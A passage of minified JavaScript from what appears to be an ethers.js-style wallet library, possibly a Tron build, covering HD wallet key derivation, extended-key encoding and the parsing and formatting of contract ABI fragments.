                }),
                _S(this, {
                    mnemonic: a
                })
            }
            connect(e) {
                return new IM(EM,this.signingKey,this.parentFingerprint,this.chainCode,this.path,this.index,this.depth,this.mnemonic,e)
            }
            async encrypt(e, t) {
                return await async function(e, t, r) {
                    null == r && (r = {});
                    const n = hM(t)
                      , o = pM(r);
                    return gM(zS(await cM(n, o.salt, o.N, o.r, o.p, 64, r.progressCallback)), o, e, r)
                }(PS(SM, this, BM).call(this), e, {
                    progressCallback: t
                })
            }
            encryptSync(e) {
                return function(e, t, r) {
                    null == r && (r = {});
                    const n = hM(t)
                      , o = pM(r);
                    return gM(zS(lM(n, o.salt, o.N, o.r, o.p, 64)), o, e, r)
                }(PS(SM, this, BM).call(this), e)
            }
            get extendedKey() {
                return MS(this.depth < 256, "Depth too deep", "UNSUPPORTED_OPERATION", {
                    operation: "extendedKey"
                }),
                AM(KS(["0x0488ADE4", TM(this.depth, 1), this.parentFingerprint, TM(this.index, 4), this.chainCode, KS(["0x00", this.privateKey])]))
            }
            hasPath() {
                return null != this.path
            }
            neuter() {
                return new OM(EM,this.address,this.publicKey,this.parentFingerprint,this.chainCode,this.path,this.index,this.depth,this.provider)
            }
            deriveChild(e) {
                const t = cI(e, "index");
                NS(t <= 4294967295, "invalid index", "index", t);
                let r = this.path;
                r && (r += "/" + (2147483647 & t),
                t & vM && (r += "'"));
                const {IR: n, IL: o} = PM(t, this.chainCode, this.publicKey, this.privateKey)
                  , i = new DO(lI((aI(o) + BigInt(this.privateKey)) % wM, 32));
                return new IM(EM,i,this.fingerprint,$S(n),r,t,this.depth + 1,this.mnemonic,this.provider)
            }
            derivePath(e) {
                return CM(this, e)
            }
            static fromExtendedKey(e) {
                const t = uI(function(e) {
                    let t = KR;
                    for (let r = 0; r < e.length; r++)
                        t *= ZR,
                        t += $R(e[r]);
                    return t
                }(e));
                NS(82 === t.length || AM(t.slice(0, 78)) === e, "invalid extended key", "extendedKey", "[ REDACTED ]");
                const r = t[4]
                  , n = $S(t.slice(5, 9))
                  , o = parseInt($S(t.slice(9, 13)).substring(2), 16)
                  , i = $S(t.slice(13, 45))
                  , s = t.slice(45, 78);
                switch ($S(t.slice(0, 4))) {
                case "0x0488b21e":
                case "0x043587cf":
                    {
                        const e = $S(s);
                        return new OM(EM,LO(e),e,n,i,null,o,r,null)
                    }
                case "0x0488ade4":
                case "0x04358394 ":
                    if (0 !== s[0])
                        break;
                    return new IM(EM,new DO(s.slice(1)),n,i,null,o,r,null,null)
                }
                NS(!1, "invalid extended key prefix", "extendedKey", "[ REDACTED ]")
            }
            static createRandom(e, t, r) {
                null == e && (e = ""),
                null == t && (t = mM),
                null == r && (r = vx.wordlist());
                const n = Px.fromEntropy(zW(16), e, r);
                return xM.call(IM, n.computeSeed(), n).derivePath(t)
            }
            static fromMnemonic(e, t) {
                return t || (t = mM),
                xM.call(IM, e.computeSeed(), e).derivePath(t)
            }
            static fromPhrase(e, t, r, n) {
                null == t && (t = ""),
                null == r && (r = mM),
                null == n && (n = vx.wordlist());
                const o = Px.fromPhrase(e, t, n);
                return xM.call(IM, o.computeSeed(), o).derivePath(r)
            }
            static fromSeed(e) {
                return xM.call(IM, e, null)
            }
        }
        function BM() {
            const e = {
                address: this.address,
                privateKey: this.privateKey
            }
              , t = this.mnemonic;
            return this.path && t && "en" === t.wordlist.locale && "" === t.password && (e.mnemonic = {
                path: this.path,
                locale: "en",
                entropy: t.entropy
            }),
            e
        }
        function xM(e, t) {
            NS(qS(e), "invalid seed", "seed", "[REDACTED]");
            const r = zS(e, "seed");
            NS(r.length >= 16 && r.length <= 64, "invalid seed", "seed", "[REDACTED]");
            const n = zS(Bx("sha512", bM, r))
              , o = new DO($S(n.slice(0, 32)));
            return new yM(EM,o,"0x00000000",$S(n.slice(32)),"m",0,0,t,null)
        }
        yM = IM;
        class OM extends VR {
            constructor(e, t, r, n, o, i, s, a, c) {
                super(t, c),
                (0,
                CI.A)(this, "publicKey", void 0),
                (0,
                CI.A)(this, "fingerprint", void 0),
                (0,
                CI.A)(this, "parentFingerprint", void 0),
                (0,
                CI.A)(this, "chainCode", void 0),
                (0,
                CI.A)(this, "path", void 0),
                (0,
                CI.A)(this, "index", void 0),
                (0,
                CI.A)(this, "depth", void 0),
                LS(e, EM, "HDNodeVoidWallet"),
                _S(this, {
                    publicKey: r
                });
                _S(this, {
                    publicKey: r,
                    fingerprint: YS(UW(BB(r)), 0, 4),
                    parentFingerprint: n,
                    chainCode: o,
                    path: i,
                    index: s,
                    depth: a
                })
            }
            connect(e) {
                return new OM(EM,this.address,this.publicKey,this.parentFingerprint,this.chainCode,this.path,this.index,this.depth,e)
            }
            get extendedKey() {
                return MS(this.depth < 256, "Depth too deep", "UNSUPPORTED_OPERATION", {
                    operation: "extendedKey"
                }),
                AM(KS(["0x0488B21E", TM(this.depth, 1), this.parentFingerprint, TM(this.index, 4), this.chainCode, this.publicKey]))
            }
            hasPath() {
                return null != this.path
            }
            deriveChild(e) {
                const t = cI(e, "index");
                NS(t <= 4294967295, "invalid index", "index", t);
                let r = this.path;
                r && (r += "/" + (2147483647 & t),
                t & vM && (r += "'"));
                const {IR: n, IL: o} = PM(t, this.chainCode, this.publicKey, null)
                  , i = DO.addPoints(o, this.publicKey, !0)
                  , s = LO(i);
                return new OM(EM,s,i,this.fingerprint,$S(n),r,t,this.depth + 1,this.provider)
            }
            derivePath(e) {
                return CM(this, e)
            }
        }
        const _M = {
            en: vx.wordlist()
        };
        var WM;
        function RM(e) {
            const t = new Set;
            return e.forEach((e => t.add(e))),
            Object.freeze(t)
        }
        const kM = "constant external internal payable private public pure view"
          , MM = RM(kM.split(" "))
          , NM = "constructor error event fallback function receive struct"
          , FM = RM(NM.split(" "))
          , UM = "calldata memory storage payable indexed"
          , DM = RM(UM.split(" "))
          , LM = RM([NM, UM, "tuple returns", kM].join(" ").split(" "))
          , jM = {
            "(": "OPEN_PAREN",
            ")": "CLOSE_PAREN",
            "[": "OPEN_BRACKET",
            "]": "CLOSE_BRACKET",
            ",": "COMMA",
            "@": "AT"
        }
          , zM = new RegExp("^(\\s*)")
          , VM = new RegExp("^([0-9]+)")
          , HM = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)")
          , qM = new RegExp("^([a-zA-Z$_][a-zA-Z0-9$_]*)$")
          , GM = new RegExp("^(trcToken|address|bool|bytes([0-9]*)|string|u?int([0-9]*))$");
        var $M = new WeakMap
          , KM = new WeakMap
          , ZM = new WeakSet;
        class YM {
            get offset() {
                return SS($M, this)
            }
            get length() {
                return SS(KM, this).length - SS($M, this)
            }
            constructor(e) {
                DB(this, ZM),
                ES(this, $M, void 0),
                ES(this, KM, void 0),
                CS($M, this, 0),
                CS(KM, this, e.slice())
            }
            clone() {
                return new WM(SS(KM, this))
            }
            reset() {
                CS($M, this, 0)
            }
            popKeyword(e) {
                const t = this.peek();
                if ("KEYWORD" !== t.type || !e.has(t.text))
                    throw new Error("expected keyword ".concat(t.text));
                return this.pop().text
            }
            popType(e) {
                if (this.peek().type !== e)
                    throw new Error("expected ".concat(e, "; got ").concat(JSON.stringify(this.peek())));
                return this.pop().text
            }
            popParen() {
                const e = this.peek();
                if ("OPEN_PAREN" !== e.type)
                    throw new Error("bad start");
                const t = PS(ZM, this, JM).call(this, SS($M, this) + 1, e.match + 1);
                return CS($M, this, e.match + 1),
                t
            }
            popParams() {
                const e = this.peek();
                if ("OPEN_PAREN" !== e.type)
                    throw new Error("bad start");
                const t = [];
                for (; SS($M, this) < e.match - 1; ) {
                    const e = this.peek().linkNext;
                    t.push(PS(ZM, this, JM).call(this, SS($M, this) + 1, e)),
                    CS($M, this, e)
                }
                return CS($M, this, e.match + 1),
                t
            }
            peek() {
                if (SS($M, this) >= SS(KM, this).length)
                    throw new Error("out-of-bounds");
                return SS(KM, this)[SS($M, this)]
            }
            peekKeyword(e) {
                const t = this.peekType("KEYWORD");
                return null != t && e.has(t) ? t : null
            }
            peekType(e) {
                if (0 === this.length)
                    return null;
                const t = this.peek();
                return t.type === e ? t.text : null
            }
            pop() {
                var e;
                const t = this.peek();
                return CS($M, this, (e = SS($M, this),
                e++,
                e)),
                t
            }
            toString() {
                const e = [];
                for (let t = SS($M, this); t < SS(KM, this).length; t++) {
                    const r = SS(KM, this)[t];
                    e.push("".concat(r.type, ":").concat(r.text))
                }
                return "<TokenString ".concat(e.join(" "), ">")
            }
        }
        function JM() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 0
              , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0;
            return new WM(SS(KM, this).slice(e, t).map((t => Object.freeze(Object.assign({}, t, {
                match: t.match - e,
                linkBack: t.linkBack - e,
                linkNext: t.linkNext - e
            })))))
        }
        function XM(e) {
            const t = []
              , r = t => {
                const r = i < e.length ? JSON.stringify(e[i]) : "$EOI";
                throw new Error("invalid token ".concat(r, " at ").concat(i, ": ").concat(t))
            }
              , n = []
              , o = [];
            let i = 0;
            for (; i < e.length; ) {
                let s = e.substring(i)
                  , a = s.match(zM);
                a && (i += a[1].length,
                s = e.substring(i));
                const c = {
                    depth: n.length,
                    linkBack: -1,
                    linkNext: -1,
                    match: -1,
                    type: "",
                    text: "",
                    offset: i,
                    value: -1
                };
                t.push(c);
                const l = jM[s[0]] || "";
                if (l) {
                    if (c.type = l,
                    c.text = s[0],
                    i++,
                    "OPEN_PAREN" === l)
                        n.push(t.length - 1),
                        o.push(t.length - 1);
                    else if ("CLOSE_PAREN" == l)
                        0 === n.length && r("no matching open bracket"),
                        c.match = n.pop(),
                        t[c.match].match = t.length - 1,
                        c.depth--,
                        c.linkBack = o.pop(),
                        t[c.linkBack].linkNext = t.length - 1;
                    else if ("COMMA" === l)
                        c.linkBack = o.pop(),
                        t[c.linkBack].linkNext = t.length - 1,
                        o.push(t.length - 1);
                    else if ("OPEN_BRACKET" === l)
                        c.type = "BRACKET";
                    else if ("CLOSE_BRACKET" === l) {
                        let e = t.pop().text;
                        if (t.length > 0 && "NUMBER" === t[t.length - 1].type) {
                            const r = t.pop().text;
                            e = r + e,
                            t[t.length - 1].value = cI(r)
                        }
                        if (0 === t.length || "BRACKET" !== t[t.length - 1].type)
                            throw new Error("missing opening bracket");
                        t[t.length - 1].text += e
                    }
                } else if (a = s.match(HM),
                a) {
                    if (c.text = a[1],
                    i += c.text.length,
                    LM.has(c.text)) {
                        c.type = "KEYWORD";
                        continue
                    }
                    if (c.text.match(GM)) {
                        c.type = "TYPE";
                        continue
                    }
                    c.type = "ID"
                } else {
                    if (a = s.match(VM),
                    !a)
                        throw new Error("unexpected token ".concat(JSON.stringify(s[0]), " at position ").concat(i));
                    c.text = a[1],
                    c.type = "NUMBER",
                    i += c.text.length
                }
            }
            return new YM(t.map((e => Object.freeze(e))))
        }
        function QM(e, t) {
            const r = [];
            for (const n in t.keys())
                e.has(n) && r.push(n);
            if (r.length > 1)
                throw new Error("conflicting types: ".concat(r.join(", ")))
        }
        function eN(e, t) {
            if (t.peekKeyword(FM)) {
                const r = t.pop().text;
                if (r !== e)
                    throw new Error("expected ".concat(e, ", got ").concat(r))
            }
            return t.popType("ID")
        }
        function tN(e, t) {
            const r = new Set;
            for (; ; ) {
                const n = e.peekType("KEYWORD");
                if (null == n || t && !t.has(n))
                    break;
                if (e.pop(),
                r.has(n))
                    throw new Error("duplicate keywords: ".concat(JSON.stringify(n)));
                r.add(n)
            }
            return Object.freeze(r)
        }
        function rN(e) {
            const t = tN(e, MM);
            return QM(t, RM("constant payable nonpayable".split(" "))),
            QM(t, RM("pure view payable nonpayable".split(" "))),
            t.has("view") ? "view" : t.has("pure") ? "pure" : t.has("payable") ? "payable" : t.has("nonpayable") ? "nonpayable" : t.has("constant") ? "view" : "nonpayable"
        }
        function nN(e, t) {
            return e.popParams().map((e => bN.from(e, t)))
        }
        function oN(e) {
            if (e.peekType("AT")) {
                if (e.pop(),
                e.peekType("NUMBER"))
                    return oI(e.pop().text);
                throw new Error("invalid gas")
            }
            return null
        }
        function iN(e) {
            if (e.length)
                throw new Error("unexpected tokens: ".concat(e.toString()))
        }
        WM = YM;
        const sN = new RegExp(/^(.*)\[([0-9]*)\]$/);
        function aN(e) {
            const t = e.match(GM);
            if (NS(t, "invalid type", "type", e),
            "uint" === e)
                return "uint256";
            if ("int" === e)
                return "int256";
            if (t[2]) {
                const r = parseInt(t[2]);
                NS(0 !== r && r <= 32, "invalid bytes length", "type", e)
            } else if (t[3]) {
                const r = parseInt(t[3]);
                NS(0 !== r && r <= 256 && r % 8 === 0, "invalid numeric width", "type", e)
            }
            return e
        }
        const cN = {}
          , lN = Symbol.for("_ethers_internal")
          , uN = "_ParamTypeInternal"
          , dN = "_ErrorInternal"
          , hN = "_EventInternal"
          , fN = "_ConstructorInternal"
          , pN = "_FallbackInternal"
          , gN = "_FunctionInternal"
          , yN = "_StructInternal";
        var mN = new WeakSet;
        class bN {
            constructor(e, t, r, n, o, i, s, a) {
                if (DB(this, mN),
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "type", void 0),
                (0,
                CI.A)(this, "baseType", void 0),
                (0,
                CI.A)(this, "indexed", void 0),
                (0,
                CI.A)(this, "components", void 0),
                (0,
                CI.A)(this, "arrayLength", void 0),
                (0,
                CI.A)(this, "arrayChildren", void 0),
                LS(e, cN, "ParamType"),
                Object.defineProperty(this, lN, {
                    value: uN
                }),
                i && (i = Object.freeze(i.slice())),
                "array" === n) {
                    if (null == s || null == a)
                        throw new Error("")
                } else if (null != s || null != a)
                    throw new Error("");
                if ("tuple" === n) {
                    if (null == i)
                        throw new Error("")
                } else if (null != i)
                    throw new Error("");
                _S(this, {
                    name: t,
                    type: r,
                    baseType: n,
                    indexed: o,
                    components: i,
                    arrayLength: s,
                    arrayChildren: a
                })
            }
            format(e) {
                if (null == e && (e = "sighash"),
                "json" === e) {
                    const t = {
                        type: "tuple" === this.baseType ? "tuple" : this.type,
                        name: this.name || void 0
                    };
                    return "boolean" === typeof this.indexed && (t.indexed = this.indexed),
                    this.isTuple() && (t.components = this.components.map((t => JSON.parse(t.format(e))))),
                    JSON.stringify(t)
                }
                let t = "";
                return this.isArray() ? (t += this.arrayChildren.format(e),
                t += "[".concat(this.arrayLength < 0 ? "" : String(this.arrayLength), "]")) : this.isTuple() ? ("sighash" !== e && (t += this.type),
                t += "(" + this.components.map((t => t.format(e))).join("full" === e ? ", " : ",") + ")") : t += this.type,
                "sighash" !== e && (!0 === this.indexed && (t += " indexed"),
                "full" === e && this.name && (t += " " + this.name)),
                t
            }
            isArray() {
                return "array" === this.baseType
            }
            isTuple() {
                return "tuple" === this.baseType
            }
            isIndexable() {
                return null != this.indexed
            }
            walk(e, t) {
                if (this.isArray()) {
                    if (!Array.isArray(e))
                        throw new Error("invalid array value");
                    if (-1 !== this.arrayLength && e.length !== this.arrayLength)
                        throw new Error("array is wrong length");
                    return e.map((e => {
                        var r;
                        return null === (r = this.arrayChildren) || void 0 === r ? void 0 : r.walk(e, t)
                    }
                    ))
                }
                if (this.isTuple()) {
                    if (!Array.isArray(e))
                        throw new Error("invalid tuple value");
                    if (e.length !== this.components.length)
                        throw new Error("array is wrong length");
                    return e.map(( (e, r) => {
                        var n;
                        return null === (n = this.components) || void 0 === n ? void 0 : n[r].walk(e, t)
                    }
                    ))
                }
                return t(this.type, e)
            }
            async walkAsync(e, t) {
                const r = []
                  , n = [e];
                return PS(mN, this, vN).call(this, r, e, t, (e => {
                    n[0] = e
                }
                )),
                r.length && await Promise.all(r),
                n[0]
            }
            static from(e, t) {
                if (bN.isParamType(e))
                    return e;
                if ("string" === typeof e)
                    return bN.from(XM(e), t);
                if (e instanceof YM) {
                    let r = ""
                      , n = ""
                      , o = null;
                    tN(e, RM(["tuple"])).has("tuple") || e.peekType("OPEN_PAREN") ? (n = "tuple",
                    o = e.popParams().map((e => bN.from(e))),
                    r = "tuple(".concat(o.map((e => e.format())).join(","), ")")) : (r = aN(e.popType("TYPE")),
                    n = r);
                    let i = null
                      , s = null;
                    for (; e.length && e.peekType("BRACKET"); ) {
                        const t = e.pop();
                        i = new bN(cN,"",r,n,null,o,s,i),
                        s = t.value,
                        r += t.text,
                        n = "array",
                        o = null
                    }
                    let a = null;
                    if (tN(e, DM).has("indexed")) {
                        if (!t)
                            throw new Error("");
                        a = !0
                    }
                    const c = e.peekType("ID") ? e.pop().text : "";
                    if (e.length)
                        throw new Error("leftover tokens");
                    return new bN(cN,c,r,n,a,o,s,i)
                }
                const r = e.name;
                NS(!r || "string" === typeof r && r.match(qM), "invalid name", "obj.name", r);
                let n = e.indexed;
                null != n && (NS(t, "parameter cannot be indexed", "obj.indexed", e.indexed),
                n = !!n);
                let o = e.type;
                const i = o.match(sN);
                if (i) {
                    const t = parseInt(i[2] || "-1")
                      , s = bN.from({
                        type: i[1],
                        components: e.components
                    });
                    return new bN(cN,r || "",o,"array",n,null,t,s)
                }
                if ("tuple" === o || o.startsWith("tuple(") || o.startsWith("(")) {
                    const t = null != e.components ? e.components.map((e => bN.from(e))) : null;
                    return new bN(cN,r || "",o,"tuple",n,t,null,null)
                }
                return o = aN(e.type),
                new bN(cN,r || "",o,o,n,null,null,null)
            }
            static isParamType(e) {
                return e && e[lN] === uN
            }
        }
        function vN(e, t, r, n) {
            if (this.isArray()) {
                if (!Array.isArray(t))
                    throw new Error("invalid array value");
                if (-1 !== this.arrayLength && t.length !== this.arrayLength)
                    throw new Error("array is wrong length");
                const o = this.arrayChildren
                  , i = t.slice();
                return i.forEach(( (t, n) => {
                    PS(mN, o, vN).call(o, e, t, r, (e => {
                        i[n] = e
                    }
                    ))
                }
                )),
                void n(i)
            }
            if (this.isTuple()) {
                const o = this.components;
                let i;
                if (Array.isArray(t))
                    i = t.slice();
                else {
                    if (null == t || "object" !== typeof t)
                        throw new Error("invalid tuple value");
                    i = o.map((e => {
                        if (!e.name)
                            throw new Error("cannot use object value with unnamed components");
                        if (!(e.name in t))
                            throw new Error("missing value for component ".concat(e.name));
                        return t[e.name]
                    }
                    ))
                }
                if (i.length !== this.components.length)
                    throw new Error("array is wrong length");
                return i.forEach(( (t, n) => {
                    var s;
                    PS(mN, s = o[n], vN).call(s, e, t, r, (e => {
                        i[n] = e
                    }
                    ))
                }
                )),
                void n(i)
            }
            const o = r(this.type, t);
            o.then ? e.push(async function() {
                n(await o)
            }()) : n(o)
        }
        class wN {
            constructor(e, t, r) {
                (0,
                CI.A)(this, "type", void 0),
                (0,
                CI.A)(this, "inputs", void 0),
                LS(e, cN, "Fragment"),
                _S(this, {
                    type: t,
                    inputs: r = Object.freeze(r.slice())
                })
            }
            static from(e) {
                if ("string" === typeof e) {
                    try {
                        wN.from(JSON.parse(e))
                    } catch (_l) {}
                    return wN.from(XM(e))
                }
                if (e instanceof YM) {
                    switch (e.peekKeyword(FM)) {
                    case "constructor":
                        return CN.from(e);
                    case "error":
                        return EN.from(e);
                    case "event":
                        return PN.from(e);
                    case "fallback":
                    case "receive":
                        return SN.from(e);
                    case "function":
                        return IN.from(e);
                    case "struct":
                        return BN.from(e)
                    }
                } else if ("object" === typeof e) {
                    switch (e.type) {
                    case "constructor":
                        return CN.from(e);
                    case "error":
                        return EN.from(e);
                    case "event":
                        return PN.from(e);
                    case "fallback":
                    case "receive":
                        return SN.from(e);
                    case "function":
                        return IN.from(e);
                    case "struct":
                        return BN.from(e)
                    }
                    MS(!1, "unsupported type: ".concat(e.type), "UNSUPPORTED_OPERATION", {
                        operation: "Fragment.from"
                    })
                }
                NS(!1, "unsupported frgament object", "obj", e)
            }
            static isConstructor(e) {
                return CN.isFragment(e)
            }
            static isError(e) {
                return EN.isFragment(e)
            }
            static isEvent(e) {
                return PN.isFragment(e)
            }
            static isFunction(e) {
                return IN.isFragment(e)
            }
            static isStruct(e) {
                return BN.isFragment(e)
            }
        }
        class TN extends wN {
            constructor(e, t, r, n) {
                super(e, t, n),
                (0,
                CI.A)(this, "name", void 0),
                NS("string" === typeof r && r.match(qM), "invalid identifier", "name", r),
                n = Object.freeze(n.slice()),
                _S(this, {
                    name: r
                })
            }
        }
        function AN(e, t) {
            return "(" + t.map((t => t.format(e))).join("full" === e ? ", " : ",") + ")"
        }
        class EN extends TN {
            constructor(e, t, r) {
                super(e, "error", t, r),
                Object.defineProperty(this, lN, {
                    value: dN
                })
            }
            get selector() {
                return sx(this.format("sighash")).substring(0, 10)
            }
            format(e) {
                if (null == e && (e = "sighash"),
                "json" === e)
                    return JSON.stringify({
                        type: "error",
                        name: this.name,
                        inputs: this.inputs.map((t => JSON.parse(t.format(e))))
                    });
                const t = [];
                return "sighash" !== e && t.push("error"),
                t.push(this.name + AN(e, this.inputs)),
                t.join(" ")
            }
            static from(e) {
                if (EN.isFragment(e))
                    return e;
                if ("string" === typeof e)
                    return EN.from(XM(e));
                if (e instanceof YM) {
                    const t = eN("error", e)
                      , r = nN(e);
                    return iN(e),
                    new EN(cN,t,r)
                }
                return new EN(cN,e.name,e.inputs ? e.inputs.map(bN.from) : [])
            }
            static isFragment(e) {
                return e && e[lN] === dN
            }
        }
        class PN extends TN {
            constructor(e, t, r, n) {
                super(e, "event", t, r),
                (0,
                CI.A)(this, "anonymous", void 0),
                Object.defineProperty(this, lN, {
                    value: hN
                }),
                _S(this, {
                    anonymous: n
                })
            }
            get topicHash() {
                return sx(this.format("sighash"))
            }
            format(e) {
                if (null == e && (e = "sighash"),
                "json" === e)
                    return JSON.stringify({
                        type: "event",
                        anonymous: this.anonymous,
                        name: this.name,
                        inputs: this.inputs.map((t => JSON.parse(t.format(e))))
                    });
                const t = [];
                return "sighash" !== e && t.push("event"),
                t.push(this.name + AN(e, this.inputs)),
                "sighash" !== e && this.anonymous && t.push("anonymous"),
                t.join(" ")
            }
            static getTopicHash(e, t) {
                t = (t || []).map((e => bN.from(e)));
                return new PN(cN,e,t,!1).topicHash
            }
            static from(e) {
                if (PN.isFragment(e))
                    return e;
                if ("string" === typeof e)
                    return PN.from(XM(e));
                if (e instanceof YM) {
                    const t = eN("event", e)
                      , r = nN(e, !0)
                      , n = !!tN(e, RM(["anonymous"])).has("anonymous");
                    return iN(e),
                    new PN(cN,t,r,n)
                }
                return new PN(cN,e.name,e.inputs ? e.inputs.map((e => bN.from(e, !0))) : [],!!e.anonymous)
            }
            static isFragment(e) {
                return e && e[lN] === hN
            }
        }
        class CN extends wN {
            constructor(e, t, r, n, o) {
                super(e, t, r),
                (0,
                CI.A)(this, "payable", void 0),
                (0,
                CI.A)(this, "gas", void 0),
                Object.defineProperty(this, lN, {
                    value: fN
                }),
                _S(this, {
                    payable: n,
                    gas: o
                })
            }
            format(e) {
                if (MS(null != e && "sighash" !== e, "cannot format a constructor for sighash", "UNSUPPORTED_OPERATION", {
                    operation: "format(sighash)"
                }),
                "json" === e)
                    return JSON.stringify({
                        type: "constructor",
                        stateMutability: this.payable ? "payable" : "undefined",
                        payable: this.payable,
                        gas: null != this.gas ? this.gas : void 0,
                        inputs: this.inputs.map((t => JSON.parse(t.format(e))))
                    });
                const t = ["constructor".concat(AN(e, this.inputs))];
                return t.push(this.payable ? "payable" : "nonpayable"),
                null != this.gas && t.push("@".concat(this.gas.toString())),
                t.join(" ")
            }
            static from(e) {
                if (CN.isFragment(e))
                    return e;
                if ("string" === typeof e)
                    return CN.from(XM(e));
                if (e instanceof YM) {
                    tN(e, RM(["constructor"]));
                    const t = nN(e)
                      , r = !!tN(e, RM(["payable"])).has("payable")
                      , n = oN(e);
                    return iN(e),
                    new CN(cN,"constructor",t,r,n)
                }
                return new CN(cN,"constructor",e.inputs ? e.inputs.map(bN.from) : [],!!e.payable,null != e.gas ? e.gas : null)
            }
            static isFragment(e) {
                return e && e[lN] === fN
            }
        }
        class SN extends wN {
            constructor(e, t, r) {
                super(e, "fallback", t),
                (0,
                CI.A)(this, "payable", void 0),
                Object.defineProperty(this, lN, {
                    value: pN
                }),
                _S(this, {
                    payable: r
                })
            }
            format(e) {
                const t = 0 === this.inputs.length ? "receive" : "fallback";
                if ("json" === e) {
                    const e = this.payable ? "payable" : "nonpayable";
                    return JSON.stringify({
                        type: t,
                        stateMutability: e
                    })
                }
                return "".concat(t, "()").concat(this.payable ? " payable" : "")
            }
            static from(e) {
                if (SN.isFragment(e))
                    return e;
                if ("string" === typeof e)
                    return SN.from(XM(e));
                if (e instanceof YM) {
                    const t = e.toString();
                    NS(e.peekKeyword(RM(["fallback", "receive"])), "type must be fallback or receive", "obj", t);
                    if ("receive" === e.popKeyword(RM(["fallback", "receive"]))) {
                        const t = nN(e);
                        return NS(0 === t.length, "receive cannot have arguments", "obj.inputs", t),
                        tN(e, RM(["payable"])),
                        iN(e),
                        new SN(cN,[],!0)
                    }
                    let r = nN(e);
                    r.length ? NS(1 === r.length && "bytes" === r[0].type, "invalid fallback inputs", "obj.inputs", r.map((e => e.format("minimal"))).join(", ")) : r = [bN.from("bytes")];
                    const n = rN(e);
                    if (NS("nonpayable" === n || "payable" === n, "fallback cannot be constants", "obj.stateMutability", n),
                    tN(e, RM(["returns"])).has("returns")) {
                        const t = nN(e);
                        NS(1 === t.length && "bytes" === t[0].type, "invalid fallback outputs", "obj.outputs", t.map((e => e.format("minimal"))).join(", "))
                    }
                    return iN(e),
                    new SN(cN,r,"payable" === n)
                }
                if ("receive" === e.type)
                    return new SN(cN,[],!0);
                if ("fallback" === e.type) {
                    const t = [bN.from("bytes")]
                      , r = "payable" === e.stateMutability;
                    return new SN(cN,t,r)
                }
                NS(!1, "invalid fallback description", "obj", e)
            }
            static isFragment(e) {
                return e && e[lN] === pN
            }
        }
        class IN extends TN {
            constructor(e, t, r, n, o, i) {
                super(e, "function", t, n),
                (0,
                CI.A)(this, "constant", void 0),
                (0,
                CI.A)(this, "outputs", void 0),
                (0,
                CI.A)(this, "stateMutability", void 0),
                (0,
                CI.A)(this, "payable", void 0),
                (0,
                CI.A)(this, "gas", void 0),
                Object.defineProperty(this, lN, {
                    value: gN
                });
                _S(this, {
                    constant: "view" === r || "pure" === r,
                    gas: i,
                    outputs: o = Object.freeze(o.slice()),
                    payable: "payable" === r,
                    stateMutability: r
                })
            }
            get selector() {
                return sx(this.format("sighash")).substring(0, 10)
            }
            format(e) {
                if (null == e && (e = "sighash"),
                "json" === e)
                    return JSON.stringify({
                        type: "function",
                        name: this.name,
                        constant: this.constant,
                        stateMutability: "nonpayable" !== this.stateMutability ? this.stateMutability : void 0,
                        payable: this.payable,
                        gas: null != this.gas ? this.gas : void 0,
                        inputs: this.inputs.map((t => JSON.parse(t.format(e)))),
                        outputs: this.outputs.map((t => JSON.parse(t.format(e))))
                    });
                const t = [];
                return "sighash" !== e && t.push("function"),
                t.push(this.name + AN(e, this.inputs)),
                "sighash" !== e && ("nonpayable" !== this.stateMutability && t.push(this.stateMutability),
                this.outputs && this.outputs.length && (t.push("returns"),
                t.push(AN(e, this.outputs))),
                null != this.gas && t.push("@".concat(this.gas.toString()))),
                t.join(" ")
            }
            static getSelector(e, t) {
                t = (t || []).map((e => bN.from(e)));
                return new IN(cN,e,"view",t,[],null).selector
            }
            static from(e) {
                if (IN.isFragment(e))
                    return e;
                if ("string" === typeof e)
                    return IN.from(XM(e));
                if (e instanceof YM) {
                    const t = eN("function", e)
                      , r = nN(e)
                      , n = rN(e);
                    let o = [];
                    tN(e, RM(["returns"])).has("returns") && (o = nN(e));
                    const i = oN(e);
                    return iN(e),
                    new IN(cN,t,n,r,o,i)
                }
                let t = e.stateMutability;
                return null == t && (t = "payable",
                "boolean" === typeof e.constant ? (t = "view",
                e.constant || (t = "payable",
                "boolean" !== typeof e.payable || e.payable || (t = "nonpayable"))) : "boolean" !== typeof e.payable || e.payable || (t = "nonpayable")),
                new IN(cN,e.name,t,e.inputs ? e.inputs.map(bN.from) : [],e.outputs ? e.outputs.map(bN.from) : [],null != e.gas ? e.gas : null)
            }
            static isFragment(e) {
                return e && e[lN] === gN
            }
        }
        class BN extends TN {
            constructor(e, t, r) {
                super(e, "struct", t, r),
                Object.defineProperty(this, lN, {
                    value: yN
                })
            }
            format() {
                throw new Error("@TODO")
            }
            static from(e) {
                if ("string" === typeof e)
                    return BN.from(XM(e));
                if (e instanceof YM) {
                    const t = eN("struct", e)
                      , r = nN(e);
                    return iN(e),
                    new BN(cN,t,r)
                }
                return new BN(cN,e.name,e.inputs ? e.inputs.map(bN.from) : [])
            }
            static isFragment(e) {
                return e && e[lN] === yN
            }
        }
        class xN {
            constructor(e, t, r) {
                (0,
                CI.A)(this, "fragment", void 0),
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "signature", void 0),
                (0,
                CI.A)(this, "topic", void 0),
                (0,
                CI.A)(this, "args", void 0);
                const n = e.name
                  , o = e.format();
                _S(this, {
                    fragment: e,
                    name: n,
                    signature: o,
                    topic: t,
                    args: r
                })
            }
        }
        class ON {
            constructor(e, t, r, n) {
                (0,
                CI.A)(this, "fragment", void 0),
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "args", void 0),
                (0,
                CI.A)(this, "signature", void 0),
                (0,
                CI.A)(this, "selector", void 0),
                (0,
                CI.A)(this, "value", void 0);
                const o = e.name
                  , i = e.format();
                _S(this, {
                    fragment: e,
                    name: o,
                    args: r,
                    signature: i,
                    selector: t,
                    value: n
                })
            }
        }
        class _N {
            constructor(e, t, r) {
                (0,
                CI.A)(this, "fragment", void 0),
                (0,
                CI.A)(this, "name", void 0),
                (0,
                CI.A)(this, "args", void 0),
                (0,
                CI.A)(this, "signature", void 0),
                (0,
                CI.A)(this, "selector", void 0);
                const n = e.name
                  , o = e.format();
                _S(this, {
                    fragment: e,
                    name: n,
                    args: r,
                    signature: o,
                    selector: t
                })
            }
        }
